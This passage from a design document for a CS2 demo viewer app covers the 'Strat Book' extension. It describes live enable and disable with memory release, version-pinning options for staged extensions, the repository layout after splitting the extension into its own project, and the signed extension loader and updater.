  enable's attach item is still only the first thing to READ Team Identity's files, as it always was; a
  read that reaches a detached service
  (a queued one that lost the race with a release) reads and writes nothing.
- *Measured* (`StratBookLiveToggleTests`, `[Category("Budget")]`, 160 synthetic demos with 24 rounds and
  60 grenades each, a mine and a watch seeded): an enable builds about 21 MB on the GC heap; the release
  leaves 0.5 MB after the first off-on-off cycle and 0.0 MB after the second, so nothing grows per toggle.

**Session restore.** If the persisted active tab id belongs to a disabled pack, restore lands on Library.
Pack session blobs of a disabled pack are preserved in the session file untouched, so re-enabling restores
the collapsed rail.

**WASM.** Same switch, same semantics; there is less to turn off because the browser already keeps strat
data for the session only.

---

## 4. Release and compatibility rules

1. **Boundary:** the whole Strat Room is in the pack, and so are Round Facts, Teams and Provenance, so "off"
   removes their indexing cost. The Review Queue stays core, since Reels uses it.
2. **Default:** first-run setup asks whether to turn it on; the answer sets the master switch. Upgrades keep
   it on.
3. **Toggling:** turning it off is live and must also release its memory in session. No "reclaimed on
   restart" fallback.
4. **Name:** users see it as an **extension** ("Strat Book extension"). The per-section switches stay under
   the master switch.
5. **Structure:** each extension lives in its own directory from the start and becomes its own
   csproj once the edges are cut, so extensions can be released on a different cadence from the app.
6. **How strictly a staged extension is pinned to the app build.** The extension compiles
   against the app assembly, Avalonia, CS2DemoKit, Playback2D and the rest of the app's packages, and a
   staged copy built against a different patch of any of them loads and fails only when the mismatched
   member is first called. Two options:
   - **(A) Exact pin.** The manifest carries a `builtAgainst` block (app version, Avalonia, CS2DemoKit,
     Playback2D, the other shared packages) written by CI, and the loader refuses any staged copy not
     built against the running app's exact versions. Safest: a staged copy can never meet a member it was
     not compiled against. Cost: every app release that bumps a shared package needs an extension
     re-release, and an extension release targets exactly one app release.
   - **(B) Contract range plus checks.** The manifest's `requiresHost`, `requiresCs2DemoKit` and
     `minAppVersion` ranges, plus the loader's reference-version check and load-time probe (section 2.8).
     An extension release rides across app releases that keep the shared package versions, and a bump
     that changes an assembly version is caught at load. Residual risk: a package whose assembly version
     does not move with its package version, and anything compiled on first use (lambda bodies,
     `Contribute`, views), can still fail after the loader reported success.

   The loader implements (B), with two rules on top. Every extension
   release states the oldest extension framework it runs on (`requiresHost`, section 2.7), and the
   contract never takes a breaking change outside a major release of the app, so an extension built for
   one app major keeps loading across that major's minors and patches. The versioning setup (section 2.11)
   makes the extension's version computed by Nerdbank.GitVersioning from its own `version.json`, starting
   at 0.1.

---

## 5. Repository layout

Before the move to its own project, inside the app project, with namespaces unchanged:

```
src/App/DemoViewer.NET/Extensions/StratBook/
  StratBookPack.cs                      the IExtension
  Modules/     StratBook, UtilityBook, RoundTagger, SuggestedTags, Situations, Dossier, Teams, Review
  Services/    Strats, RoundIndex, RoundFacts, Tags, Teams, Provenance
  ViewModels/  StratBook, UtilityBook, Situations, Dossier, RoundTagger, SuggestedTags, Teams, Review
  Views/       StratBook, UtilityBook, Situations, Dossier, RoundTagger, SuggestedTags, Teams, Review
  Controls/    PlaceField.axaml(.cs), PlaceFieldModel.cs
  Assets/      Palettes, Callouts
src/App/DemoViewer.NET.App.Tests/Extensions/StratBook/
src/App/DemoViewer.NET.UiCapture/Extensions/StratBook/
```

The actual move list differs from the draft above it replaced. `Services/Provenance` moved whole:
the boundary rule names it explicitly, even though `MainViewModel` and `LibraryTabViewModel` keep forward
references into it, the same shape as the Teams and Round Facts edges the boundary rule also accepts as
pre-existing and leaves for later contribution work to cut. `Services/Review` did not move at all: `ReviewQueue`
and `ReviewQueueMigration` are both core (Highlights is a consumer), so nothing in that folder is
pack-owned; the pack side of Review is `Modules/Review`, `ViewModels/Review` and `Views/Review` (the hub
section and its tab), which did move. The ViewModels and Views lists grew from the draft's partial set to
the full eight sections, matching Modules. `Services/Zones` stays core: core code outside the Strat Book
set consumes it (`RuleWorkbenchTabViewModel`, `Playback2DTabViewModel`, and `App.axaml.cs`'s composition
root), not only the two pack view models a narrower grep would suggest.
`ViewModels/Settings/SuggestedTagsTuningViewModel.cs` also stays where it is for now, even though it
belongs with the pack: `SettingsViewModel`'s constructor takes it directly, and that seam still needs to
be cut before it can move.

After the move to its own project:

```
src/Extensions/StratBook/
  DemoViewer.NET.Extensions.StratBook/              the csproj; references src/App/DemoViewer.NET
    DemoViewer.NET.Extensions.StratBook.csproj      RootNamespace DemoViewer.NET; AssemblyName DemoViewer.NET.Extensions.StratBook
    AssemblyInfo.cs                                 InternalsVisibleTo App.Tests and UiCapture
    StratBookPack.cs, StratBookLifecycle.cs, ...    the pack root files
    Modules/ Services/ ViewModels/ Views/ Controls/ Assets/   the pre-split tree, moved whole, namespaces unchanged
    Services/Zones/AssetZonePlaceResolverSource.cs  the one file that moved in from core (it implements a pack interface)
    Playback2D/Input/TokenTool.cs                   moved in from Playback2D Core, namespace DemoViewer.NET.Extensions.StratBook.Playback2D.Input
    Playback2D/Layers/GuideLayer.cs                 moved in, namespace DemoViewer.NET.Extensions.StratBook.Playback2D.Layers
    Playback2D/Frames/StratFrameSource.cs, StratSceneSpec.cs   moved in, namespace ...Playback2D.Frames
    Playback2D/Hud/StratHudDataSource.cs            moved in, namespace ...Playback2D.Hud
    Playback2D/Keyframes/StepSchedule.cs, TokenKeyframe.cs, TokenTrack*.cs   moved in, namespace UNCHANGED (DemoViewer.NET.Playback2D.Core.Keyframes; nothing in Core used it)
  DemoViewer.NET.Extensions.StratBook.Tests/        RootNamespace DemoViewer.NET.AppTests (the App.Tests one)
    *.cs                                             flat, no subfolders: 182 files moved whole or split
                                                       out of App.Tests, plus StepScheduleTests, StratFrameSourceTests,
                                                       TokenTrackTests and TokenToolTests (moved a second time,
                                                       App.Tests/Extensions/StratBook/Playback2D/ to here), and
                                                       TokenToolHostTests (split out of Scene2DHostFrameHostTests,
                                                       which stayed in App.Tests)
    RoundIndexTestData.cs, CacheRecordTestExtensions.cs, StratBookHubAccess.cs, ToleranceSliderHarness.cs
                                                       linked back into App.Tests: core tests use them as fixtures
  extension.json                                    the manifest template (section 2.7); stamped, embedded and copied beside the DLL
  version.json                                      the extension's own Nerdbank.GitVersioning file (0.1, pathFilters on this directory)
src/Sdk/DemoViewer.NET.Extensions.Sdk/build/DemoViewer.NET.Extensions.Sdk.targets            the stamping target every extension csproj imports
src/App/DemoViewer.NET.App.Tests/Extensions/PackBoundaryTests.cs   pack-agnostic; pulled out of the test-project move
src/App/DemoViewer.NET.UiCapture/Extensions/StratBook/      the pack's capture variants; the test-project move did not touch this
src/App/DemoViewer.NET/Extensions/Loading/        the loader (section 2.8) and the signing and
                                                   trust seam (section 2.9: ExtensionSignature.cs,
                                                   PublisherKeys.cs, SignedTrustPolicy.cs); the app, so
                                                   every head can use it
src/App/DemoViewer.NET/Extensions/Updates/        the feed, the updater and the staging rules (section 2.10)
src/App/DemoViewer.NET/ViewModels/Settings/ExtensionUpdateRow.cs   the update line under an extension's Settings row
tools/extension-signing/          the signing tool (section 2.9), the packaging commands
                                   (section 2.11: report, manifest, zip, feed-merge, feed-check) and
                                   DeterministicZip.cs/FeedMerge.cs; outside the .slnx; links source from
                                   the app (Extensions/Loading, Extensions/Manifest, Extensions/Updates)
                                   rather than referencing it
scripts/pack-extension.sh         build, stage, sign, zip and feed entry for one extension release
.github/workflows/release-extension.yml   the release workflow (section 2.11)
```

At run time, under the config root (`AppPaths.ConfigRoot`), the updater stages what the loader loads:

```
<config root>/extensions/<id>/<version>/          one staged extension version; read by the Desktop head at startup
  extension.json                                  id and version equal to the folder names
  extension.sig                                   the detached signature (section 2.9) over everything else here, as it came out of the zip
  DemoViewer.NET.Extensions.StratBook.dll         the assembly the manifest names
<config root>/extensions/.staging/<id>/           the updater's work in progress; skipped by the loader, removed at the next start
  <version>.zip.part                              the download, verified against the feed's size and sha256
  <version>/                                      the unpacked copy, judged by the trust policy, then renamed into place
```

The namespace rule for a moved type: it keeps its original namespace when the move vacates that namespace
entirely from Core/Pipeline (`Keyframes`: nothing else lived there); it takes an extension-owned namespace
(`DemoViewer.NET.Extensions.StratBook.Playback2D.<Area>`) when a sibling stays behind under the same
namespace and core app files import it for that sibling (`Input`: `DrawTool`/`EraseTool`/the router stay;
`Layers`: `MarkerLayer`/`RadarLayer`/etc. stay; `Pipeline.Frames`: `TrackerFrameSource`/`FixtureFrameSource`
stay; `Pipeline.Hud`: `TimelineHudDataSource`/`KillFeedTimeline` stay). Keeping the old namespace there would
make `PackBoundaryTests`' pack-owned-namespace scan flag every one of those unrelated App files as a false
edge. `ITokenEditor`, `TokenGrip`, `TokenHitTest`, `SceneGuides`, `TokenRouteLine`, `Scene2DFrame.Routes` and
`ScenePalette.Route*` are not moved at all, because `MarkerLayer` (core) draws `Scene2DFrame.Routes`
unconditionally and `SceneFixtureSerializer` (pipeline) round-trips it in every golden fixture, pack or no
pack; moving them would make two core/pipeline files reference the extension.

Rules as built:

- **The app references no extension.** `src/App/DemoViewer.NET/DemoViewer.NET.csproj` has no project
  reference under `src/Extensions/`; the compiler enforces the boundary and `PackBoundaryTests` asserts the
  csproj so a reference cannot be added quietly. The extension references the app. The heads (Desktop,
  Browser), `DemoViewer.NET.App.Tests` and `DemoViewer.NET.UiCapture` reference both.
- **Composition.** `FeaturePacks.Default` is empty until the head calls
  `FeaturePacks.Configure([new StratBookPack()])`, which both heads do before Avalonia starts, UiCapture does
  on its first line and the test assembly does from a module initializer (`CompiledInPacks`).
  `Configure` judges each pack against `ExtensionHost.Current` as it sets the list (section 2.7), and the
  readers take the subset that passed: `FeatureCatalog`, `JobKindRegistry.Default`, `CommandRegistry.Default`,
  the `ViewLocator` and `App.BuildServices(windowService)` all read `FeaturePacks.Compatible`; `Default` is the
  declared list and `Statuses` the verdicts, which Settings reads. The list freezes on first read of any of
  the three because the registries build from it once; a second or late `Configure` throws (`FrozenList<T>`,
  pinned by `FeaturePacksTests`). Each head's `BuildAvaloniaApp` also calls `FeaturePacks.ConfigureIfUnset`
  with the same list, a no-op after Main, because the XAML previewer calls that method without running Main.
  The tests that build the composition root are unchanged, and the pack-off tests override the gate rather
  than the list.
- **InternalsVisibleTo.** The app grants `DemoViewer.NET.Extensions.StratBook` (a first-party extension
  composes over the same internal seams the app's own composition root uses; the loader loads only
  first-party signed assemblies, so this exposes nothing to third parties) and
  `DemoViewer.NET.Extensions.StratBook.Tests` (the same internal seams App.Tests reaches). The
  extension grants `DemoViewer.NET.App.Tests`, `DemoViewer.NET.UiCapture` and
  `DemoViewer.NET.Extensions.StratBook.Tests`. **The Playback2D Core/Pipeline split** adds a second grantor: `DemoViewer.NET.Playback2D.Core`
  also grants `DemoViewer.NET.Extensions.StratBook`, because the strat frame source (moved there) writes
  `Scene2DFrame`'s internal backing fields directly, the pooled-refill pattern `SceneFrameBuilder` itself
  uses; `Scene2DHost.AddTool`/`AddLayer`/`FrameHost` stay covered by the app's existing grant. No core
  member was widened to public for the split.
- **Views.** `ViewLocator` keeps the naming convention and, when `Type.GetType` finds nothing in the app
  assembly, asks each compatible pack's assembly (`pack.GetType().Assembly.GetType(name)`). Pack views
  carry no `avares://` URI and no `assembly=` xmlns today; theme tokens stay in the app (section 2.4).
- **Shared namespaces.** `DemoViewer.NET.Services.RoundFacts` (models and `IRoundFactsSource` in core,
  `RoundFactsSource` and the evaluator in the pack), `DemoViewer.NET.Services.RoundIndex`
  (`RoundIndexTokenSource` in core, the index in the pack) and `DemoViewer.NET.Services.Zones` (Zone Baking in
  core, the resolver source in the pack) are declared by both assemblies. `PackBoundaryTests` treats a
  namespace both declare as shared and scans core only for the pack-owned ones.
- **Resources.** The palettes and callouts are `EmbeddedResource`s of the extension under the logical names
  they always had (`DemoViewer.NET.Services.Tags.Palettes.*`, `DemoViewer.NET.Services.Strats.Callouts.*`);
  `TagPaletteStore` and `CanonicalPlaces` read `typeof(...).Assembly`, which is now the extension.
- **Publishing.** The heads reference the extension, so `dotnet publish` of a head ships
  `DemoViewer.NET.Extensions.StratBook.dll` beside the app with no script change; `scripts/publish.sh` and
  the release workflow are unchanged.
- **The extension's own release.** A separate workflow, `release-extension.yml`, and a separate
  script, `scripts/pack-extension.sh`, cut and publish one extension version independently of an app
  release; `release.yml` itself is untouched, since the app installer still bundles whichever extension
  version the heads reference at the time the app is released. `ExtensionPackagingTests` (App.Tests) links
  `tools/extension-signing/FeedMerge.cs` the same way the four test-project fixtures are linked the other
  direction, so the rolling feed's merge rules are tested in C#, not only exercised through the CLI.
  Section 2.11 has the rest.

What stays in the app: generic capabilities the work added to core regardless of the pack (lanes, shape
tools, `MapSceneHost`, zones, `QueueWork`, the processing queue) and the Review Queue (the boundary rule).
Capabilities the Strat Book work added that core features also consume moved with the extension once
their contribution seams existed. Which `Services/` folders are pack-only versus shared was settled by
the initial move list, reviewed before the move.
